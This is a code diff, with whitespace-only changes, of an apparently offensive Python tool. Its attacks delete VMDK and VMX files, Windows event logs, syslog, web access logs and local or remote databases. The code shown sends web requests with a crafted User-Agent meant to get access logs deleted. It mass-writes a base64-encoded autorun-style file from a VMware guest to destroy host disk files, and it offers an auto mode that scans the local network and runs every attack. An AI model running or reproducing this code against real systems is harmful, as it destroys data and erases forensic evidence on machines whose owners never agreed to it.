@@ -17,7 +17,7 @@ if platform.system() == 'Windows':
     from event_log import run_remote_security_event_log_deletion, run_local_application_event_log_attack
 
 LIST_OF_ATTACKS = ['vmx', 'vmdk', 'windows_security_event_log_remote',
-                   'windows_application_event_log_local', 'syslog', 
+                   'windows_application_event_log_local', 'syslog',
                    'access_logs', 'remote_db', 'local_db', 'remote_db_webserver']
 
 signature_DB = None
@@ -78,7 +78,7 @@ def run_auto_mode():
 def run_access_logs_attack(ip: str, port: int = 80, log_insertion: int = 10):
     """
     Deletes the access logs in the given web server by sending a GET request with malicous user-agent
-    
+
     :param ip: The IP address of the web server.
     :param port: The port number the web server, defualt = 80
     :param log_insertion: The amount of times send the request to the web server, defualt = 10
@@ -90,7 +90,7 @@ def run_access_logs_attack(ip: str, port: int = 80, log_insertion: int = 10):
             try:
                 requests.get(
                     f"http://{ip}/", headers={'User-Agent': signature.get_signature_data()}, timeout=1)
-            
+
             except ValueError:
                 pass
             except Exception as e:
@@ -101,7 +101,7 @@ def run_VMDK_attack():
     """
     Deletes the VMDK files on the host machine, this function should be run inside the guest machine
     it's done be writing to disk a malicous file, the file will be written to the VMDK files at the host machine, and will be deleted there.
-    
+
     Note: if the VMDK files are encerypted, this method won't work.
     """
     if not is_running_under_VMware():
@@ -110,7 +110,7 @@ def run_VMDK_attack():
 
     logging.info("Running VMDK attack")
     MALICOUS_FILE = "W2F1dG9ydW5dDQpzaGVsbGV4ZWN1dGU9eTMyNHNlZHguZXhlDQppY29uPSVTeXN0ZW1Sb290JVxzeXN0ZW0zMlxTSEVMTDMyLmRsbCw0DQphY3Rpb249T3BlbiBmb2xkZXIgdG8gdmlldyBmaWxlcw0Kc2hlbGxcZGVmYXVsdD1PcGVuDQpzaGVsbFxkZWZhdWx0XGNvbW1hbmQ9eTMyNHNlZHguZXhlDQpzaGVsbD1kZWZhdWx0"
-    i =0 
+    i =0
     for k in range(100_000):
         with open(f"test_file_{i}_{k}", 'wb') as test_file:
             test_file.write(base64.b64decode(MALICOUS_FILE))
@@ -155,12 +155,12 @@ def parse_args():
         '-auto', help='Automatically scan the curernt C LAN network and perform every possible attack')
     parser.add_argument(
         '-sigfile', help='A Path to the encrypted signatures file')
-    
+
     parser.add_argument(
         '-ip', help='A IP address for remote attack (default: localhost)')
     parser.add_argument(
         '-port', help='Port number for remote connection to DB / WebServer / EventLog')
-    
+
     parser.add_argument(
         '-db_username', help='A username for remote connection to database (used in remote_db_attack)')
     parser.add_argument(
@@ -194,7 +194,7 @@ def main():
     if args.auto:
         run_auto_mode()
         exit(0)
-    
+
     if args.attack:
         if args.attack not in LIST_OF_ATTACKS:
             logging.error(f"Attack not exists, list of attacks:\n{LIST_OF_ATTACKS}")
@@ -218,7 +218,7 @@ def main():
 
         elif args.attack == "vmx":
             run_VMX_attack(args.rpc_tools)
-        
+
 
         elif args.attack == "access_logs":
             if args.ip:
@@ -232,10 +232,10 @@ def main():
         elif args.attack == "remote_db":
             if all([args.db_type, args.db_username, args.db_password, args.ip]):
                 run_remote_database_attack(signature_DB,
-                                           args.db_type, 
-                                           args.db_username, 
-                                           args.db_password, 
-                                           args.ip, 
+                                           args.db_type,
+                                           args.db_username,
+                                           args.db_password,
+                                           args.ip,
                                            args.port or 3306,
                                            args.db_name,
                                            args.table_name)
